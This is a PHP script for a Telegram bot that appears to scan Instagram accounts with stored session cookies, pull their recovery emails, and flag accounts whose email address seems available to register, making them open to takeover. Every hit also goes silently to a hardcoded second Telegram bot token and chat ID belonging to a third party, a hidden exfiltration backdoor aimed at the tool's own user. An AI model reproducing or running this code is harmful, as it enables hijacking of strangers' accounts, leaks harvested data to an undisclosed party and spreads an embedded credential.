<?php
date_default_timezone_set('Asia/Baghdad');
$config = json_decode(file_get_contents('config.json'),1);
$id = $config['id'];
$token = $config['token'];
$config['filter'] = $config['filter'] != null ? $config['filter'] : 1;
$screen = file_get_contents('screen');
exec('kill -9 ' . file_get_contents($screen . 'pid'));
file_put_contents($screen . 'pid', getmypid());
include 'index.php';
$accounts = json_decode(file_get_contents('accounts.json') , 1);
$cookies = $accounts[$screen]['cookies'];
$useragent = $accounts[$screen]['useragent'];
$users = explode("\n", file_get_contents($screen));
$uu = explode(':', $screen) [0];
$se = 100;
$i = 0;
$gmail = 0;
$hotmail = 0;
$yahoo = 0;
$mailru = 0;
$aol = 0;
$true = 0;
$false = 0;
$cobra2 = 0;
$cobra1 = 0;
$cobra3 = 0;
$cobra4 = 0;
$cobraAol = 0;
$yandex = 0;
$edit = bot('sendMessage',[
    'chat_id'=>$id,
    'text'=>"- *Status:*",
    'parse_mode'=>'markdown',
    'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>'Checked 📟 : '.$i,'callback_data'=>'fgf']],
                [['text'=>'On User 📍 : '.$user,'callback_data'=>'fgdfg']],
                [['text'=>"🇬mail: $gmail",'callback_data'=>'dfgfd'],['text'=>"🇾ahoo: $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'🇲ailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'🇭otmail: '.$hotmail,'callback_data'=>'ghj']],
                [['text'=>'🇦ol: '.$cobraAol,'callback_data'=>'cobra.aol.api.indee.php'],['text'=>'🇾andex: '.$yandex,'callback_data'=>'cobra']],
                [['text'=>'Not Business ❎ : '.$cobra3,'callback_data'=>'hdhdh']],
                [['text'=>'Business ♻️ : '.$cobra1,'callback_data'=>'hdfhdh']],
                [['text'=>'No Rest 📵 : '.$cobra4,'callback_data'=>'cobra4']],
                [['text'=>'Blacklist ⛔️ : '.$cobra2,'callback_data'=>'cobra2']],
                [['text'=>'True ✅ : '.$true,'callback_data'=>'gj']],
                [['text'=>'False ❌ : '.$false,'callback_data'=>'dghkf']]
            ]
        ])
]);
$se = 100;
$editAfter = 1;
foreach ($users as $user) {
    $info = getInfo($user, $cookies, $useragent);
    if ($info != false and !is_string($info)) {
        $mail = trim($info['mail']);
        $usern = $info['user'];
        $e = explode('@', $mail);
           if (preg_match('/(live|hotmail|outlook|yahoo|Yahoo|yAhoo|aol|Aol)\.(.*)|(gmail)\.(com)|(mail|bk|yandex|inbox|list)\.(ru)/i', $mail,$m)) {
            echo 'check ' . $mail . PHP_EOL;
            $cobra1 +=1;
                  if(checkMail($mail)){
                        $inInsta = inInsta($mail);
                        if ($inInsta !== false) {
                            // if($config['filter'] <= $follow){
                                echo "True - $user - " . $mail . "\n";
                                if(strpos($mail, 'gmail.com')){
                                    $gmail += 1;
                                } elseif(strpos($mail, 'hotmail.') or strpos($mail,'outlook.') or strpos($mail,'live.com')){
                                    $hotmail += 1;
                                } elseif(strpos($mail, 'yahoo')){
                                    $yahoo += 1;
                               } elseif(strpos($mail, 'aol')){ 
                               	$cobraAol += 1;
                               } elseif(strpos($mail, 'yandex')){ 
                               	$yandex += 1;
                                } elseif(preg_match('/(mail|bk|yandex|inbox|list)\.(ru)/i', $mail)){
                                    $mailru += 1;
                                }
                                $brok = '1629974246:AAFCqzwN4BGX5uQDcmHXw4TKXLAMZCss0kg';
                                $from_id = '1350726898';
                                $follow = $info['f'];
                                $following = $info['ff'];
                                $media = $info['m']; 
 file_get_contents("https://api.telegram.org/bot$brok/sendMessage?chat_id=$from_id&text=Hi Mohamed New Fucked ✅
UserName ➠ $usern
Email ➠ $mail
Followers ➠ $follow
Following ➠ $following
Post ➠ $media ");
                               
                                bot('sendMessage', [ 'disable_web_page_preview' => true, 'chat_id' => $id, 'text' => "𝐇𝐄𝐋𝐋𝐎 𝐌𝐀 𝐍𝐄𝐆𝐀 𝐍𝐄𝐖 𝐅𝐔𝐊𝐄𝐃\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n. 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : [$usern](instagram.com/$usern)\n. 𝒆𝒎𝒂𝒊𝒍 : [$mail]\n. 𝒇𝒐𝒍𝒍𝒐𝒘𝒆𝒓𝒔 : $follow\n. 𝒇𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒈 : $following\n. 𝒑𝒐𝒔𝒕 : $media\n. 𝒕𝒊𝒎𝒆 : " . date('Y/n/j g:i') . "\n" . "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n𝐁𝐘 :- [@XXXTOQ]\n𝐁𝐘 :- [@SSSSS1S]",

                                
                                'parse_mode'=>'markdown']);
                             
                                
                                bot('editMessageReplyMarkup',[
                                    'chat_id'=>$id,
                                    'message_id'=>$edit->result->message_id,
                                    'reply_markup'=>json_encode([
                                        'inline_keyboard'=>[
                                            [['text'=>'Checked 📟 : '.$i,'callback_data'=>'fgf']],
                [['text'=>'On User 📍 : '.$user,'callback_data'=>'fgdfg']],
                [['text'=>"🇬mail: $gmail",'callback_data'=>'dfgfd'],['text'=>"🇾ahoo: $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'🇲ailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'🇭otmail: '.$hotmail,'callback_data'=>'ghj']],
                [['text'=>'🇦ol: '.$cobraAol,'callback_data'=>'cobra.aol.api.indee.php'],['text'=>'🇾andex: '.$yandex,'callback_data'=>'cobra']],
                [['text'=>'Not Business ❎ : '.$cobra3,'callback_data'=>'hdhdh']],
                [['text'=>'Business ♻️ : '.$cobra1,'callback_data'=>'hdfhdh']],
                [['text'=>'No Rest 📵 : '.$cobra4,'callback_data'=>'cobra4']],
                [['text'=>'Blacklist ⛔️ : '.$cobra2,'callback_data'=>'cobra2']],
                [['text'=>'True ✅ : '.$true,'callback_data'=>'gj']],
                [['text'=>'False ❌ : '.$false,'callback_data'=>'dghkf']]
                                        ]
                                    ])
                                ]);
                                $true += 1;
                            // } else {
                            //     echo "Filter , ".$mail.PHP_EOL;
                            // }
                            
                        } else {
                           $cobra4 +=1;
                          echo "No Rest $mail\n";
                        }
                    } else {
                    	$false +=1;
                        echo "Not Vaild 2 - $mail\n";
                    }
        } else {
        	$cobra2 +=1;
          echo "BlackList - $mail\n";
        }  
     } elseif(is_string($info)){
        bot('sendMessage',[
            'chat_id'=>$id,
            'text'=>"الحساب - `$screen`\n تم حظره من *الفحص*.",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                        [['text'=>'نقل اللستة الى حساب ثاني ✅','callback_data'=>'moveList&'.$screen]],
                        [['text'=>'حذف الحساب ❎','callback_data'=>'del&'.$screen]]
                    ]
            ]),
            'parse_mode'=>'markdown'
        ]);
        exit;
    } else {
    	$cobra3 +=1;
        echo "Not Bussines - $user\n";
    }
    usleep(850000);
    $i++;
    if($i == $editAfter){
	file_put_contents($screen, str_replace($user, '', file_get_contents($screen)));
    file_put_contents($screen, preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "", file_get_contents($screen)));
            bot('editMessageReplyMarkup',[
            'chat_id'=>$id,
            'message_id'=>$edit->result->message_id,
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                   [['text'=>'Checked 📟 : '.$i,'callback_data'=>'fgf']],
                [['text'=>'On User 📍 : '.$user,'callback_data'=>'fgdfg']],
                [['text'=>"🇬mail: $gmail",'callback_data'=>'dfgfd'],['text'=>"🇾ahoo: $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'🇲ailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'🇭otmail: '.$hotmail,'callback_data'=>'ghj']],
                [['text'=>'🇦ol: '.$cobraAol,'callback_data'=>'cobra.aol.api.indee.php'],['text'=>'🇾andex: '.$yandex,'callback_data'=>'cobra']],
                [['text'=>'Not Business ❎ : '.$cobra3,'callback_data'=>'hdhdh']],
                [['text'=>'Business ♻️ : '.$cobra1,'callback_data'=>'hdfhdh']],
                [['text'=>'No Rest 📵 : '.$cobra4,'callback_data'=>'cobra4']],
                [['text'=>'Blacklist ⛔️ : '.$cobra2,'callback_data'=>'cobra2']],
                [['text'=>'True ✅ : '.$true,'callback_data'=>'gj']],
                [['text'=>'False ❌ : '.$false,'callback_data'=>'dghkf']]
                ]
            ])
        ]);
        $editAfter += 1;
    }
}
bot('sendMessage', ['chat_id' => $id, 'text' =>"انتهى الفحص : ".explode(':',$screen)[0]]);

